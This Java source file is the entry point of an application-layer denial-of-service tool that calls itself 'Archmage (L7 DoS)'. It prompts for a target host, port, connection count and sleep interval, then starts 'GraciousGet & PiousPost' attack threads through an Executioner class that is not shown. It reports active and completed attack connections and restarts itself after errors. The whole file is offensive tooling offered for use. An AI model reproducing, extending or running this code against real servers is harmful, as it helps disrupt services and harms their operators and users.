package m3rlin;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

import m3rlin.ut1ls.Params;

import org.apache.log4j.Logger;

public class Bootstrap {

	private static Logger log = Logger.getLogger(Bootstrap.class);
	private static final String STOP_ATTACK = "STOP";
	private static final String EXIT_ARCHMAGE = "EXIT";

	Executioner executioner;

	private Socket socket;
	private Scanner console;
	private String host;
	private int port;
	private int connections;
	private int interval;

	public void start() {
		try {
			System.out.print("\n>> Establishing connection to " + host + ":" + port + "...");
			socket = new Socket(host, port);
			System.out.print("\n>> Connection established...");
			System.out.print("\n>> Begninning GraciousGet & PiousPost attacks...\n\n");
			executioner = new Executioner(host, port, connections, interval);
			executioner.start();
			while (executioner.isRunning()) {
				if(console.hasNextLine()) {
					String input = console.nextLine();
					if (input != null && input.length() > 0) {
						if (input.equalsIgnoreCase(STOP_ATTACK)) {
							stop();
						} else if (input.equalsIgnoreCase(EXIT_ARCHMAGE)) {
							exit();
						}
					} else {
						printSummary();						
					}
				}
			}
		} catch (UnknownHostException e) {			
			System.out.print("\n>> Could not locate the host (UnknownHostException)\n");			
		} catch (ConnectException e) {		
			System.out.print("\n>> Could not connect to the socket address, check the port (ConnectException)\n");			
		} catch (IllegalArgumentException e) {			
			System.out.print("\n>> Port out of range (IllegalArgumentException)\n");
		} catch (IOException e) {
			System.out.print("\n>> Error acquiring socket connection (IOException)\n");
		}
		// Restart the application
		init();
		start();
	}

	public void stop() throws IOException {
		log.info("Stopping attack...");
		executioner.stop();
		socket.close();
		log.info("Attack stopped...\n");
	}

	public void exit() throws IOException {
		stop();
		log.info("Exiting...");
		System.exit(0);
	}

	public void init() {
		console = new Scanner(System.in);
		System.out.print("\nEnter target IP or host (Default: localhost): ");
		host = Params.getString(console.nextLine(), "localhost");
		System.out.print("Enter target port (Default: 80): ");
		port = Params.getInt(console.nextLine(), 80);
		System.out.print("Number of connections per attack (Default: 150): ");
		connections = Params.getInt(console.nextLine(), 150);
		System.out.print("Sleep timed attacks for N milliseconds (Default: 2000): ");
		interval = Params.getInt(console.nextLine(), 2000);
	}

	public void printSummary() {
		System.out.print("\n>> +------------------------------+");
		System.out.print("\n>> | ATTACK THREADS / CONNECTIONS |");
		System.out.print("\n>> +------------------------------+");
		System.out.print("\n>>    **ACTIVE**");
		System.out.print("\n>>      |--------Total (" + (executioner.getGraciousActiveCount() + executioner.getPiousActiveCount()) + ")");
		System.out.print("\n>>      |----PiousPost (" + executioner.getPiousActiveCount() + ")");
		System.out.print("\n>>      |--GraciousGet (" + executioner.getGraciousActiveCount() + ")");
		System.out.print("\n>>      |");
		System.out.print("\n>>    **COMPLETED**");
		System.out.print("\n>>      |--------Total (" + (executioner.getGraciousCompletedCount() + executioner.getPiousCompletedCount()) + ")");
		System.out.print("\n>>      |----PiousPost (" + executioner.getPiousCompletedCount() + ")");
		System.out.print("\n>>      |--GraciousGet (" + executioner.getGraciousCompletedCount() + ")");
		System.out.print("\n>>      |");
		System.out.print("\n>>    **TOTAL SCHEDULED**");
		System.out.print("\n>>      |--------Total (" + (executioner.getGraciousTaskCount() + executioner.getPiousTaskCount()) + ")");
		System.out.print("\n>>      |----PiousPost (" + executioner.getPiousTaskCount() + ")");
		System.out.print("\n>>      |--GraciousGet (" + executioner.getGraciousTaskCount() + ")\n\n");
	}

	public static void main(String[] args) {
		System.out.print("+-------------------+\n");
		System.out.print("| Archmage (L7 DoS) |\n");
		System.out.print("+-------------------+\n");
		System.out.print("\nCommands:\"stop\" - Stops the attack; waits for each scheduled thread to complete");
		System.out.print("\n          \"exit\" - Performs a stop action, then exits the application");
		System.out.print("\n          \"[enter]\" - Press enter while attacking to check status (won't affect the attack)\n");		
		Bootstrap archmage = new Bootstrap();
		archmage.init();
		archmage.start();
	}
}